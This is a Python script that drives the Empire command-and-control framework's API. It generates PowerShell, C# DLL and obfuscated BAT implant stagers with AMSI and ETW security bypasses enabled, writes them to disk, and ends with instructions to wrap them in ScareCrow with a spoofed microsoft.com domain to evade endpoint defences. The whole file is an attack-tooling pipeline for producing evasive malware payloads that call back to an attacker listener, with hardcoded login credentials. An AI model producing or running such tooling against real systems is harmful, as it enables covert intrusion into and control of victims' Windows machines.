#!/usr/bin/env python3
import requests
import json
import base64
from pathlib import Path

API_URL = "http://127.0.0.1:1337"
LISTENER_NAME = "http_malleable"
STAGERS_DIR = Path("./stagers")
STAGERS_DIR.mkdir(exist_ok=True)

print("=" * 60)
print("🚀 EMPIRE STAGER GENERATOR")
print("=" * 60)

# Get token
print("\n[+] Getting authentication token...")
token_response = requests.post(
    f"{API_URL}/token",
    data={"username": "empireadmin", "password": "password123"}
)
token = token_response.json()['access_token']
print(f"[✓] Token obtained: {token[:30]}...")

headers = {"Authorization": f"Bearer {token}"}

# Get available stagers
print("\n[+] Fetching available stagers...")
stagers_response = requests.get(f"{API_URL}/api/v2/stagers", headers=headers)
stagers_list = stagers_response.json().get('records', [])
print(f"[✓] Found {len(stagers_list)} stager types")

print("\n" + "=" * 60)
print("GENERATING STAGERS")
print("=" * 60)

# Generate stagers
generated = []

# 1. Multi Launcher (PowerShell)
print("\n[1/3] Multi Launcher (PowerShell)...")
try:
    response = requests.post(
        f"{API_URL}/api/v2/stagers",
        headers=headers,
        json={
            "StagerName": "multi_launcher",
            "Listener": LISTENER_NAME,
            "Language": "powershell",
            "AMSIBypass": True,
            "ETWBypass": True
        }
    )
    if response.status_code in [200, 201]:
        data = response.json()
        output = data.get('stager', {}).get('output') or data.get('output', '')
        if output:
            file_path = STAGERS_DIR / "empire_ps_stager.ps1"
            file_path.write_text(output)
            print(f"[✓] Saved: {file_path}")
            generated.append(str(file_path))
        else:
            print(f"[!] No output in response")
    else:
        print(f"[!] Failed: {response.status_code}")
        print(f"    {response.text[:200]}")
except Exception as e:
    print(f"[!] Error: {e}")

# 2. Windows DLL
print("\n[2/3] Windows DLL...")
try:
    response = requests.post(
        f"{API_URL}/api/v2/stagers",
        headers=headers,
        json={
            "StagerName": "windows_dll",
            "Listener": LISTENER_NAME,
            "Language": "csharp"
        }
    )
    if response.status_code in [200, 201]:
        data = response.json()
        output = data.get('stager', {}).get('output') or data.get('output', '')
        if output:
            # Decode base64 if needed
            try:
                decoded = base64.b64decode(output)
                file_path = STAGERS_DIR / "empire_csharp_stager.dll"
                file_path.write_bytes(decoded)
            except:
                file_path = STAGERS_DIR / "empire_csharp_stager.txt"
                file_path.write_text(output)
            print(f"[✓] Saved: {file_path}")
            generated.append(str(file_path))
        else:
            print(f"[!] No output in response")
    else:
        print(f"[!] Failed: {response.status_code}")
        print(f"    {response.text[:200]}")
except Exception as e:
    print(f"[!] Error: {e}")

# 3. BAT Launcher
print("\n[3/3] Windows BAT Launcher...")
try:
    response = requests.post(
        f"{API_URL}/api/v2/stagers",
        headers=headers,
        json={
            "StagerName": "windows_launcher_bat",
            "Listener": LISTENER_NAME,
            "Obfuscate": True,
            "AMSIBypass": True
        }
    )
    if response.status_code in [200, 201]:
        data = response.json()
        output = data.get('stager', {}).get('output') or data.get('output', '')
        if output:
            file_path = STAGERS_DIR / "empire_launcher.bat"
            file_path.write_text(output)
            print(f"[✓] Saved: {file_path}")
            generated.append(str(file_path))
        else:
            print(f"[!] No output in response")
    else:
        print(f"[!] Failed: {response.status_code}")
        print(f"    {response.text[:200]}")
except Exception as e:
    print(f"[!] Error: {e}")

print("\n" + "=" * 60)
print(f"✅ Generated {len(generated)}/3 stagers")
print("=" * 60)
for f in generated:
    print(f"  ✓ {f}")

print(f"\n📂 Output directory: {STAGERS_DIR.absolute()}")
print("\n🔧 Next: Process with ScareCrow")
print("  cd /home/kali/ScareCrow")
print("  ./ScareCrow -I <stager> -Loader binary -domain microsoft.com -O <output>")
